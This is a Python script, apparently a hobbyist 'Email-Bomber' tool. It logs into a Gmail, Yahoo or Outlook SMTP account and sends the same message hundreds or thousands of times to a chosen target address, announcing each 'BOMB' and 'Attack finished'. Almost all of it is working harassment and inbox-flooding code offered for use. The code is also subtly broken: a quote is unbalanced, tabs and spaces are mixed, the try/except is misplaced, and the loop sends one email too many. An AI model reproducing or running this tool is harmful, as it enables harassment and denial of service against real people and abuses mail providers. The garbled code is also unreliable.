#this is my 1st tool So,plz dont copy it.

'''imports'''
import smtplib
import sys 

class bcolours:
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'


def banner():
	print(bcolours.RED + '=====[[Email-Bomber]]====='')
	print('v1.0')
	print(bcolours.GREEN +'Made by BDhaCkers')
	print(bcolours.RED + '''
██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
██████╦╝██║░░██║██╔BDhaCkers║██████╦╝█████╗░░██████╔╝
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝''')


class Email_Bomber:
	count = 0
	
	def __init__(self):
		try:
			print(bcolours.YELLOW + '\+n===[[Initializing Program]]===')
			self.target = str(input(bcolours.RED + 'Enter Your Target Email'))
			self.mode = int(input(bcolours.RED + 'Chose An Option (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom)  '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. try again.')
                sys.exit(1)
            except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolours.RED + '\n+[+[+[ starting]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolours.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolours.RED + f'\n+[+[+[ You have selected BOMBING mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolours.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolours.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolours.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolours.YELLOW + 'Enter from address <: '))
            self.fromPwd = str(input(bcolours.YELLOW + 'Enter from password <: '))
            self.subject = str(input(bcolours.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolours.RED+ 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolours.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolours.RED + '\n+[+[+[ START BOMBING...... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolours.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
                